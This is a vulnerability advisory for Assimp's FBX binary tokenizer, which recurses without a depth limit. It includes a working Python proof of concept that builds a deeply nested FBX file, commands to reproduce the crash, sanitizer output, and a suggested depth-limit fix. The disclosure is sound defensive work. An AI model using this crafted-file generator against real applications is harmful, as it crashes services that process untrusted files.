Stack overflow via uncontrolled recursion in FBX binary tokenizer (ReadScope)

### Summary
A stack overflow caused by uncontrolled recursion in the FBX binary tokenizer allows denial of service (and potential code execution) when Assimp processes a crafted FBX file.

### Details
Tested Version:
- Latest release: v6.0.4
- Latest master: commit `158da575` (April 6, 2026)
- Both are vulnerable.

The FBX binary tokenizer in `code/AssetLib/FBX/FBXBinaryTokenizer.cpp` recursively calls `ReadScope()` (line ~334) for each nested node in the FBX binary file. There is no depth limit on this recursion. Each recursive call adds ~200+ bytes to the stack via `ReadString()` (line ~154).

A crafted FBX binary file with ~4,000 levels of nested nodes is sufficient to exhaust a default 8 MB stack, triggering a segmentation fault.

### PoC
1. Generate the PoC file (a valid FBX binary with 4000 levels of nested nodes):
```python
import struct
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def make_fbx_deep_nesting(depth=4000):
    magic = b"Kaydara FBX Binary"
    padding = b"\x20\x20\x00\x1a\x00"
    version = struct.pack("<I", 7400)
    header = magic + padding + version

    sentinel = b"\x00" * 13  # 32-bit null record

    # Build from the inside out: each node wraps its child.
    # Node header = 14 bytes (end_offset:4 + prop_count:4 + prop_length:4 + name_len:1 + name:1)
    # Each level adds 14 (header) + 13 (sentinel) = 27 bytes
    content = b""
    for i in range(depth):
        node_header = struct.pack("<I", 0)  # placeholder end_offset
        node_header += struct.pack("<II", 0, 0)  # prop_count=0, prop_length=0
        node_header += struct.pack("<B", 1) + b"N"  # name = "N"
        content = node_header + content + sentinel

    payload = bytearray(header + content + sentinel)

    # Fix absolute end_offsets
    pos = len(header)
    for i in range(depth):
        remaining_levels = depth - 1 - i
        end_off = pos + 14 + remaining_levels * 27 + 13
        struct.pack_into("<I", payload, pos, end_off)
        pos += 14

    out_path = os.path.join(OUT, "poc.fbx")
    with open(out_path, "wb") as f:
        f.write(bytes(payload))
    print(f"Written {len(payload)} bytes to {out_path} (depth={depth})")


if __name__ == "__main__":
    make_fbx_deep_nesting(4000)
```


2. Feed generated `poc.fbx` to any application that uses Assimp to import FBX files.

```bash
# Option A: Build the CLI tool (no sanitizer — crashes as SIGSEGV)
cmake -B build -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build -j$(nproc)
./build/bin/assimp info poc.fbx     # → Segmentation fault

# Option B: Build with ASan for a cleaner trace
cmake -B build-asan -DCMAKE_C_FLAGS="-fsanitize=address" -DCMAKE_CXX_FLAGS="-fsanitize=address" \
      -DASSIMP_BUILD_ASSIMP_TOOLS=ON -DASSIMP_BUILD_TESTS=OFF
cmake --build build-asan -j$(nproc)
./build-asan/bin/assimp info poc.fbx  # → AddressSanitizer: stack-overflow
```

With AddressSanitizer enabled, the crash is:

   ```
   ==7==ERROR: AddressSanitizer: stack-overflow on address 0x7fffdad33ff8
   SUMMARY: AddressSanitizer: stack-overflow
       /src/assimp/code/AssetLib/FBX/FBXBinaryTokenizer.cpp:154
       in Assimp::FBX::(anonymous namespace)::ReadString(...)
   ```
No special build configuration is required. A default Assimp build will crash.

### Impact
Denial of Service. Any application using Assimp to load untrusted FBX files can be crashed by a malicious input. Stack overflows may also be exploitable for arbitrary code execution depending on the platform and stack layout.
Also crashes without sanitizers as a real `SIGSEGV`.


### Remediation
Add a maximum recursion depth parameter to `ReadScope()` and return a parse error when exceeded. A limit of 256 or 512 would accommodate any legitimate FBX file.